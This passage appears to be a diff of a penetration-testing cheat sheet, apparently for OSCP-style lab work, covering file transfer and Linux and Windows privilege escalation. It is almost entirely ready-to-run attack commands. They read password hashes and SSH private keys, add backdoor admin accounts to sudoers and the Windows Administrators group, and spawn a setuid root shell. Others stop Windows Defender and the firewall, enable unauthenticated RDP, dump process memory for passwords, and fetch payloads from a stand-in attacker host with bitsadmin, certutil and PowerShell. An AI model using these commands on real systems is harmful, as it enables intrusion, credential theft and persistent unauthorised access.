+<span style=color:#fff;font-weight:700>import</span> SocketServer
+PORT = <span style=color:#ff0;font-weight:700>8000</span>
+Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+httpd = SocketServer.TCPServer((<span style=color:#0ff;font-weight:700>&#34;&#34;</span>, PORT), Handler)
+<span style=color:#fff;font-weight:700>print</span> <span style=color:#0ff;font-weight:700>&#34;serving at port&#34;</span>, PORT
+httpd.serve_forever()
+
+</code></pre></div><h3 id=set-up-ftp-server>Set up FTP Server
+<a class=heading-link href=#set-up-ftp-server><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Install pyftpdlib</span>
+pip install pyftpdlib
+
+<span style=color:#007f7f># Run (-w flag allows anonymous write access)</span>
+python -m pyftpdlib -p <span style=color:#ff0;font-weight:700>21</span> -w
+
+</code></pre></div><h3 id=filet-ransfer>Filet ransfer
+<a class=heading-link href=#filet-ransfer><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f>#On sending machine</span>
+nc -w <span style=color:#ff0;font-weight:700>3</span> [destination] <span style=color:#ff0;font-weight:700>1234</span> &lt; send.file
+
+<span style=color:#007f7f>#on receiving end:</span>
+cmd /c nc.exe -l -v -p <span style=color:#ff0;font-weight:700>1234</span> &gt; PsExec.exe
+
+</code></pre></div><h2 id=linux>Linux
+<a class=heading-link href=#linux><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Useful commands</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Spawning shell</span>
+python -c <span style=color:#0ff;font-weight:700>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+python -c <span style=color:#0ff;font-weight:700>&#39;import pty; pty.spawn(&#34;/bin/sh&#34;)&#39;</span>
+V
+Ctrl+Z
+stty raw -echo
+<span style=color:#fff;font-weight:700>fg</span>
+reset
+Ctrl+Z
+stty size
+stty -rows <span style=color:#ff0;font-weight:700>48</span> -columns <span style=color:#ff0;font-weight:700>120</span>
+<span style=color:#fff;font-weight:700>fg</span>
+
+<span style=color:#fff;font-weight:700>echo</span> os.system(<span style=color:#0ff;font-weight:700>&#39;/bin/bash&#39;</span>)
+/bin/sh -i
+perl -e <span style=color:#0ff;font-weight:700>&#39;exec &#34;/bin/sh&#34;;&#39;</span>
+perl: <span style=color:#fff;font-weight:700>exec</span> <span style=color:#0ff;font-weight:700>&#34;/bin/sh&#34;</span>;
+ruby: <span style=color:#fff;font-weight:700>exec</span> <span style=color:#0ff;font-weight:700>&#34;/bin/sh&#34;</span>
+lua: os.execute(<span style=color:#0ff;font-weight:700>&#39;/bin/sh&#39;</span>)
+(From within vi)
+:!bash
+:set shell=/bin/bash:shell
+(From within nmap)
+!sh
+
+<span style=color:#007f7f># Access to more binaries</span>
+<span style=color:#fff;font-weight:700>export</span> PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+
+<span style=color:#007f7f># Set up webserver</span>
+<span style=color:#fff;font-weight:700>cd</span> /opt/privesc-scripts; python -m SimpleHTTPServer <span style=color:#ff0;font-weight:700>80</span>
+
+<span style=color:#007f7f># Download all files</span>
+wget http://$IP:8080/ -r; mv $IP exploits; <span style=color:#fff;font-weight:700>cd</span> exploits; rm index.html; chmod <span style=color:#ff0;font-weight:700>700</span> LinEnum.sh linprivchecker.py unix-privesc-check
+
+./LinEnum.sh -t -k password -r LinEnum.txt
+python linprivchecker.py extended
+./unix-privesc-check standard
+
+<span style=color:#007f7f># Writable directories</span>
+/tmp
+/var/tmp
+
+<span style=color:#007f7f># Add user to sudoers</span>
+useradd hacker
+passwd hacker
+<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;hacker ALL=(ALL:ALL) ALL&#34;</span> &gt;&gt; /etc/sudoers
+
+</code></pre></div><h3 id=basic-info>Basic info
+<a class=heading-link href=#basic-info><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>uname -a
+env
+id
+cat /proc/version
+cat /etc/issue
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+cat /etc/hosts
+
+<span style=color:#007f7f># Users with login</span>
+grep -vE <span style=color:#0ff;font-weight:700>&#34;nologin&#34;</span> /etc/passwd
+
+<span style=color:#007f7f># Priv Enumeration Scripts</span>
+upload /unix-privesc-check
+upload linuxprivchecker.py
+upload LinEnum.sh
+
+python linprivchecker.py extended
+./LinEnum.sh -t -k password
+unix-privesc-check
+
+</code></pre></div><h3 id=kernel-exploits>Kernel exploits
+<a class=heading-link href=#kernel-exploits><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>site:exploit-db.com kernel version
+
+perl /opt/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
+
+python linprivchecker.py extended
+
+</code></pre></div><h3 id=programs-running-as-root>Programs running as root
+<a class=heading-link href=#programs-running-as-root><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>ps aux
+
+</code></pre></div><h3 id=installed-software>Installed software
+<a class=heading-link href=#installed-software><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/usr/local/
+/usr/local/src
+/usr/local/bin
+/opt/
+/home
+/var/
+/usr/src/
+
+<span style=color:#007f7f># Debian</span>
+dpkg -l
+
+<span style=color:#007f7f># CentOS, OpenSuse, Fedora, RHEL</span>
+rpm -qa (CentOS / openSUSE )
+
+<span style=color:#007f7f># OpenBSD, FreeBSD</span>
+pkg_info
+
+</code></pre></div><h3 id=weakreusedplaintext-passwords>Weak/reused/plaintext passwords
+<a class=heading-link href=#weakreusedplaintext-passwords><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Check database config-file</li><li>Check databases</li><li>Check weak passwords</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>username:username
+username:username1
+username:root
+username:admin
+username:qwerty
+username:password
+
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>./LinEnum.sh -t -k password
+</code></pre></div><h3 id=inside-service>Inside service
+<a class=heading-link href=#inside-service><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>netstat -anlp
+netstat -ano
+</code></pre></div><h3 id=suid-misconfiguration>Suid misconfiguration
+<a class=heading-link href=#suid-misconfiguration><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Binary with suid permission can be run by anyone, but when they are run they are run as root!</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nmap
+vim
+nano
+curl
+...
+</code></pre></div><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># SUID</span>
+find / -perm -4000 -type f 2&gt;/dev/null
+
+<span style=color:#007f7f># ALL PERMS</span>
+find / -perm -777 -type f 2&gt;/dev/null
+
+<span style=color:#007f7f># SUID for current user</span>
+find / perm /u=s -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/null
+find / -user root -perm -4000 -print 2&gt;/dev/null
+
+<span style=color:#007f7f># Writables for current user/group</span>
+find / perm /u=w -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/null
+find / -perm /u+w,g+w -f -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/null
+find / -perm /u+w -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/nul
+
+<span style=color:#007f7f># Dirs with +w perms for current u/g</span>
+find / perm /u=w -type -d -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/null
+find / -perm /u+w,g+w -d -user <span style=color:#0ff;font-weight:700>`</span>whoami<span style=color:#0ff;font-weight:700>`</span> 2&gt;/dev/null
+</code></pre></div><h3 id=unmounted-filesystems>Unmounted filesystems
+<a class=heading-link href=#unmounted-filesystems><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>mount -l
+</code></pre></div><h3 id=cronjob>Cronjob
+<a class=heading-link href=#cronjob><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+</code></pre></div><h3 id=ssh-keys>SSH Keys
+<a class=heading-link href=#ssh-keys><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li>Chek all home dirs</li></ul><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+
+</code></pre></div><h3 id=bad-path-configuration>Bad path configuration
+<a class=heading-link href=#bad-path-configuration><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Require user interaction</span>
+<span style=color:#fff;font-weight:700>export</span> PATH=/tmp<span style=color:#0ff;font-weight:700>&#39; or your path file&#39;</span>:$PATH
+
+</code></pre></div><h3 id=find-plain-passwords>Find plain passwords
+<a class=heading-link href=#find-plain-passwords><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>grep -rnw <span style=color:#0ff;font-weight:700>&#39;/&#39;</span> -ie <span style=color:#0ff;font-weight:700>&#39;pass&#39;</span> --color=always
+grep -rnw <span style=color:#0ff;font-weight:700>&#39;/&#39;</span> -ie <span style=color:#0ff;font-weight:700>&#39;DB_PASS&#39;</span> --color=always
+grep -rnw <span style=color:#0ff;font-weight:700>&#39;/&#39;</span> -ie <span style=color:#0ff;font-weight:700>&#39;DB_PASSWORD&#39;</span> --color=always
+grep -rnw <span style=color:#0ff;font-weight:700>&#39;/&#39;</span> -ie <span style=color:#0ff;font-weight:700>&#39;DB_USER&#39;</span> --color=always
+</code></pre></div><h3 id=scripts>Scripts
+<a class=heading-link href=#scripts><i class="fa fa-link" aria-hidden=true></i></a></h3><h4 id=suid>SUID
+<a class=heading-link href=#suid><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>int main(void){
+  setresuid(0, 0, 0);
+  system(<span style=color:#0ff;font-weight:700>&#34;/bin/bash&#34;</span>);
+}
+
+<span style=color:#007f7f># Compile</span>
+gcc suid.c -o suid
+</code></pre></div><h4 id=ps-monitor-for-cron>PS Monitor for cron
+<a class=heading-link href=#ps-monitor-for-cron><i class="fa fa-link" aria-hidden=true></i></a></h4><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#0f0;font-weight:700>#!/bin/bash
+</span><span style=color:#0f0;font-weight:700></span>
+<span style=color:#007f7f># Loop by line</span>
+IFS=<span style=color:#0ff;font-weight:700>$&#39;\n&#39;</span>
+
+old_process=<span style=color:#fff;font-weight:700>$(</span>ps -eo <span style=color:#fff;font-weight:700>command</span><span style=color:#fff;font-weight:700>)</span>
+
+<span style=color:#fff;font-weight:700>while</span> true; <span style=color:#fff;font-weight:700>do</span>
+    new_process=<span style=color:#fff;font-weight:700>$(</span>ps -eo <span style=color:#fff;font-weight:700>command</span><span style=color:#fff;font-weight:700>)</span>
+    diff &lt;(<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;</span>$old_process<span style=color:#0ff;font-weight:700>&#34;</span>) &lt;(<span style=color:#fff;font-weight:700>echo</span> <span style=color:#0ff;font-weight:700>&#34;</span>$new_process<span style=color:#0ff;font-weight:700>&#34;</span>) | grep [<span style=color:#0ff;font-weight:700>\&lt;\&gt;</span>]
+    sleep <span style=color:#ff0;font-weight:700>1</span>
+    old_process=$new_process
+<span style=color:#fff;font-weight:700>done</span>
+</code></pre></div><h4 id=linux-privesc-tools>Linux Privesc Tools
+<a class=heading-link href=#linux-privesc-tools><i class="fa fa-link" aria-hidden=true></i></a></h4><ul><li><p><a href=https://gtfobins.github.io/>GTFOBins</a></p></li><li><p><a href=https://github.com/rebootuser/LinEnum>LinEnum</a></p></li><li><p><a href=https://github.com/mzet-/linux-exploit-suggester>LinuxExploitSuggester</a></p></li></ul><h3 id=linux-precompiled-exploits>Linux Precompiled Exploits
+<a class=heading-link href=#linux-precompiled-exploits><i class="fa fa-link" aria-hidden=true></i></a></h3><p><a href=https://github.com/sleventyeleven/linuxprivchecker>linuxprivchecker</a></p><h2 id=windows>Windows
+<a class=heading-link href=#windows><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.</li></ul><p>1 ) Kernel exploits
+2 ) Cleartext password
+3 ) Reconfigure service parameters
+4 ) Inside service
+5 ) Program running as root
+6 ) Installed software
+7 ) Scheduled tasks
+8 ) Weak passwords</p><h3 id=basic-info-1>Basic info
+<a class=heading-link href=#basic-info-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>systeminfo
+<span style=color:#fff;font-weight:700>set</span>
+hostname
+net users
+net user user1
+net localgroups
+accesschk.exe -uwcqv <span style=color:#0ff;font-weight:700>&#34;Authenticated Users&#34;</span> *
+
+netsh firewall show state
+netsh firewall show config
+
+# Set path
+<span style=color:#fff;font-weight:700>set</span> PATH=%PATH%;C:\xampp\php
+
+whoami /priv
+
+<span style=color:#fff;font-weight:700>dir</span>/a -&gt; Show hidden &amp; unhidden files
+<span style=color:#fff;font-weight:700>dir</span> /Q -&gt; Show permissions
+</code></pre></div><h3 id=kernel-exploits-1>Kernel exploits
+<a class=heading-link href=#kernel-exploits-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># Look for hotfixes
+systeminfo
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+# Search for exploits
+site:exploit-db.com windows XX XX
+</code></pre></div><h3 id=cleartext-passwords>Cleartext passwords
+<a class=heading-link href=#cleartext-passwords><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># Windows autologin
+reg query <span style=color:#0ff;font-weight:700>&#34;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&#34;</span>
+
+# VNC
+reg query <span style=color:#0ff;font-weight:700>&#34;HKCU\Software\ORL\WinVNC3\Password&#34;</span>
+
+# SNMP Parameters
+reg query <span style=color:#0ff;font-weight:700>&#34;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&#34;</span>
+
+# Putty
+reg query <span style=color:#0ff;font-weight:700>&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span>
+
+# Search for password in registry
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+</code></pre></div><h3 id=reconfigure-service-parameters>Reconfigure service parameters
+<a class=heading-link href=#reconfigure-service-parameters><i class="fa fa-link" aria-hidden=true></i></a></h3><ul><li><p>Unquoted service paths</p></li><li><p>Weak service permissions</p></li></ul><p><a href=https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/>https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p><h3 id=dump-process-for-passwords>Dump process for passwords
+<a class=heading-link href=#dump-process-for-passwords><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Looking for Firefox</span>
+Get-Process
+./procdump64.exe -ma $PID-FF
+Select-String -Path .<span style=color:#0ff;font-weight:700>\*</span>.dmp -Pattern <span style=color:#0ff;font-weight:700>&#39;password&#39;</span> &gt; 1.txt
+<span style=color:#fff;font-weight:700>type</span> 1.txt | findstr /s /i <span style=color:#0ff;font-weight:700>&#34;admin&#34;</span>
+</code></pre></div><h3 id=inside-service-1>Inside service
+<a class=heading-link href=#inside-service-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>netstat /a
+netstat -ano
+</code></pre></div><h3 id=programs-running-as-rootsystem>Programs running as root/system
+<a class=heading-link href=#programs-running-as-rootsystem><i class="fa fa-link" aria-hidden=true></i></a></h3><h3 id=installed-software-1>Installed software
+<a class=heading-link href=#installed-software-1><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>tasklist /SVC
+net start
+reg query HKEY_LOCAL_MACHINE\SOFTWARE
+DRIVERQUERY
+
+Look in:
+C:\Program<span style=color:#007f7f> files</span>
+C:\Program<span style=color:#007f7f> files (x86)</span>
+Home directory of the user
+</code></pre></div><h3 id=scheduled-tasks>Scheduled tasks
+<a class=heading-link href=#scheduled-tasks><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>schtasks /query /fo LIST /v
+
+Check this file:
+c:\WINDOWS\SchedLgU.Txt
+</code></pre></div><h3 id=weak-passwords>Weak passwords
+<a class=heading-link href=#weak-passwords><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd>ncrack -vv --user george -P /usr/.../passwords.txt rdp://$IP
+</code></pre></div><h3 id=add-user-and-enable-rdp>Add user and enable RDP
+<a class=heading-link href=#add-user-and-enable-rdp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># Add new user
+
+net user haxxor Haxxor123 /add
+net localgroup Administrators haxxor /add
+net localgroup <span style=color:#0ff;font-weight:700>&#34;Remote Desktop Users&#34;</span> haxxor /ADD
+
+# Turn firewall off and enable RDP
+
+sc stop WinDefend
+netsh advfirewall show allprofiles
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+reg add <span style=color:#0ff;font-weight:700>&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&#34;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add <span style=color:#0ff;font-weight:700>&#34;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&#34;</span> /v UserAuthentication /t REG_DWORD /d 0 /f
+</code></pre></div><h3 id=powershell-sudo-for-windows>Powershell sudo for Windows
+<a class=heading-link href=#powershell-sudo-for-windows><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$pw= convertto-securestring <span style=color:#0ff;font-weight:700>&#34;EnterPasswordHere&#34;</span> -asplaintext -force
+$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist <span style=color:#0ff;font-weight:700>&#34;EnterDomainName\EnterUserName&#34;</span>,$pw
+$script = <span style=color:#0ff;font-weight:700>&#34;C:\Users\EnterUserName\AppData\Local\Temp\test.bat&#34;</span>
+Start-Process powershell -Credential $pp -ArgumentList <span style=color:#0ff;font-weight:700>&#39;-noprofile -command &amp;{Start-Process $script -verb Runas}&#39;</span>
+
+powershell -ExecutionPolicy Bypass -File xyz.ps1
+</code></pre></div><h3 id=windows-download-with-bitsadmin>Windows download with bitsadmin
+<a class=heading-link href=#windows-download-with-bitsadmin><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>bitsadmin /transfer mydownloadjob /download /priority normal http://&lt;attacker&gt;/nc.exe C:<span style=color:#0ff;font-weight:700>\\</span>Users<span style=color:#0ff;font-weight:700>\\</span>%USERNAME%<span style=color:#0ff;font-weight:700>\\</span>AppData<span style=color:#0ff;font-weight:700>\\</span>local<span style=color:#0ff;font-weight:700>\\</span>temp<span style=color:#0ff;font-weight:700>\\</span>nc.exe
+
+</code></pre></div><h3 id=windows-download-with-certutilexe>Windows download with certutil.exe
+<a class=heading-link href=#windows-download-with-certutilexe><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>certutil.exe -urlcache -split -f <span style=color:#0ff;font-weight:700>&#34;http://&lt;attacker&gt;/Powerless.bat&#34;</span> Powerless.bat
+
+</code></pre></div><h3 id=creating-a-wget-vb-script-on-windows>Creating a wget VB Script on Windows
+<a class=heading-link href=#creating-a-wget-vb-script-on-windows><i class="fa fa-link" aria-hidden=true></i></a></h3><p><a href=https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt><em>https://github.com/erik1o6/oscp/blob/master/wget-vbs-win.txt</em></a></p><h3 id=windows-download-with-powershell>Windows download with powershell
+<a class=heading-link href=#windows-download-with-powershell><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>powershell -c <span style=color:#0ff;font-weight:700>&#34;(new-object System.Net.WebClient).DownloadFile(&#39;http://10.11.1.111/file.exe&#39;,&#39;C:\Users\user\Desktop\file.exe&#39;)&#34;</span>
+
+(New-Object System.Net.WebClient).DownloadFile(<span style=color:#0ff;font-weight:700>&#34;http://10.11.1.111/CLSID.list&#34;</span>,<span style=color:#0ff;font-weight:700>&#34;C:\Users\Public\CLSID.list&#34;</span>)
+
+</code></pre></div><h3 id=windows-download-from-ftp>Windows Download from FTP
+<a class=heading-link href=#windows-download-from-ftp><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># In reverse shell</span>
+<span style=color:#fff;font-weight:700>echo</span> open $IP &gt; ftp.txt
+<span style=color:#fff;font-weight:700>echo</span> USER anonymous &gt;&gt; ftp.txt
+<span style=color:#fff;font-weight:700>echo</span> ftp &gt;&gt; ftp.txt
+<span style=color:#fff;font-weight:700>echo</span> bin &gt;&gt; ftp.txt
+<span style=color:#fff;font-weight:700>echo</span> GET file &gt;&gt; ftp.txt
+<span style=color:#fff;font-weight:700>echo</span> bye &gt;&gt; ftp.txt
+
+<span style=color:#007f7f># Execute</span>
+ftp -v -n -s:ftp.txt
+
+</code></pre></div><h3 id=windows-create-smb-server-transfer-files>Windows create SMB Server transfer files
+<a class=heading-link href=#windows-create-smb-server-transfer-files><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#007f7f># Attack machine</span>
+python /usr/share/doc/python-impacket/examples/smbserver.py
+
+    <span style=color:#007f7f># Or SMB service</span>
+    <span style=color:#007f7f># http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</span>
+    vim /etc/samba/smb.conf
+        [global]
+        workgroup = WORKGROUP
+        server string = Samba Server %v
+        netbios name = indishell-lab
+        security = user
+        map to guest = bad user
+        name resolve order = bcast host
+        dns proxy = no
+        <span style=color:#fff;font-weight:700>bind</span> interfaces only = yes
+
+        [ica]
+        path = /var/www/html/pub
+        writable = no
+        guest ok = yes
+        guest only = yes
+        <span style=color:#fff;font-weight:700>read</span> only = yes
+        directory mode = <span style=color:#ff0;font-weight:700>0555</span>
+        force user = nobody
+
+    chmod -R <span style=color:#ff0;font-weight:700>777</span> smb_path
+    chown -R nobody:nobody smb_path
+    service smbd restart
+
+<span style=color:#007f7f># Victim machine with reverse shell</span>
+Download: copy <span style=color:#0ff;font-weight:700>\\</span>$IP<span style=color:#0ff;font-weight:700>\L</span>ab<span style=color:#0ff;font-weight:700>\w</span>ce.exe .
+Upload: copy wtf.jpg <span style=color:#0ff;font-weight:700>\\</span>$IP<span style=color:#0ff;font-weight:700>\L</span>ab
+
+</code></pre></div><h3 id=windows-download-with-vbs>Windows download with VBS
+<a class=heading-link href=#windows-download-with-vbs><i class="fa fa-link" aria-hidden=true></i></a></h3><div class=highlight><pre style=color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># In reverse shell
+<span style=color:#fff;font-weight:700>echo</span> strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Err.Clear &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Set http = Nothing &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> Set http = CreateObject(<span style=color:#0ff;font-weight:700>&#34;WinHttp.WinHttpRequest.5.1&#34;</span>) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> If http Is Nothing Then Set http = CreateObject(<span style=color:#0ff;font-weight:700>&#34;WinHttp.WinHttpRequest&#34;</span>) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> If http Is Nothing Then Set http = CreateObject(<span style=color:#0ff;font-weight:700>&#34;MSXML2.ServerXMLHTTP&#34;</span>) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> If http Is Nothing Then Set http = CreateObject(<span style=color:#0ff;font-weight:700>&#34;Microsoft.XMLHTTP&#34;</span>) &gt;&gt; wget.vbs
+<span style=color:#fff;font-weight:700>echo</span> http.Open <span style=color:#0ff;font-weight:700>&#34;GET&#34;</span>,strURL,False &gt;&gt; wget.vbs
